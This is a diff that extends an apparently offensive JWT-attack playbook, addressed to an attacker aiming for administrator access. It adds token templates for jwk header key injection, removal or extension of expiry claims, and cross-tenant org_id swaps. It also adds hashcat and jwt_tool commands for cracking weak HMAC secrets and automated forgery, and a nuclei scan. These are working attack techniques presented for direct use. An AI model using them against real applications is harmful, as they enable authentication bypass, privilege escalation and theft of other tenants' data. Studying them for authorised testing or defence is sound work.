@@ -78,9 +78,63 @@ attacker-controlled and reaches a dangerous sink.
    path on the target's OWN domain so the fetch resolves to your JWKS.
 ```
 
+**jwk header self-signed key injection (RS256) — embed an attacker-controlled public key in the token**
+```
+header:  {"alg":"RS256","jwk":{"kty":"RSA","n":"<your_rsa_modulus>","e":"AQAB"}}
+payload: {"sub":"administrator"}
+signature: (sign with your matching private key)
+```
+Some verifiers incorrectly trust a `jwk` (JSON Web Key) claim in the header and use it to validate the signature. Generate your own RSA keypair, embed the public key in the token header, sign with your private key, and send. Works when the verifier does not verify the key's provenance or allowlist.
+
+**Expiry / time-based claim manipulation**
+```
+Remove "exp" (expiration) claim entirely — many validators skip the check if absent.
+Or set "nbf" (not before) to the past and "exp" (expiration) to far future (e.g. year 2099).
+Edit payload: {"sub":"administrator","nbf":1000000000,"exp":4102444800}
+```
+Combined with any forging technique above (alg:none, key confusion, jwk injection), this
+bypasses time-based validation when the verifier does not enforce strict expiry rules.
+
+**Cross-tenant claim injection — escalate to another tenant's data via claim swaps**
+```
+Identify tenant-related claims in a decoded real token: "org_id", "tenant", "account_id",
+"workspace_id", "customer_id". Edit the target claim to another tenant's value.
+Example: {"sub":"victim@org.com","org_id":1234} → change org_id to an admin's org (e.g. 9999).
+```
+This is systematic IDOR via claims — if authorization logic trusts the token claims
+without checking ownership server-side, you cross into another tenant's resources.
+Works especially well combined with alg:none or weak-secret attacks.
+
 Match the `payload` shape to a REAL token from the app (decode one first) — keep
 its claim names, only change identity/role. A payload the app can't parse fails
 for the wrong reason and wastes the attempt.
+
+## Offline attacks — weak HMAC secret cracking
+
+If the token is HS256 (HMAC-based) and the secret is weak or reused from a known
+password list:
+```bash
+# Hashcat: mode 16500 = JWT
+hashcat -a 0 -m 16500 <jwt_file> rockyou.txt
+
+# jwt_tool: built-in wordlist cracking
+jwt_tool <token> -C -d wordlist.txt
+```
+Once the secret is cracked, forge any token using HS256 with that secret (via
+jwt_tool or PyJWT).
+
+## Automated attack automation
+
+Use purpose-built JWT attack suites to run all known forgery modes in parallel:
+```bash
+# jwt_tool: auto-try alg:none, key confusion, kid injection, etc.
+jwt_tool <token> -X a
+
+# Nuclei: automated JWT vuln scanning
+nuclei -u <target_url> -t jwt/ -timeout 10s
+```
+Run these early in JWT recon; they often find the vulnerability faster than
+manual chaining of individual techniques.
 
 ## Drive to the ADMIN objective — do not stop at a working forge
 
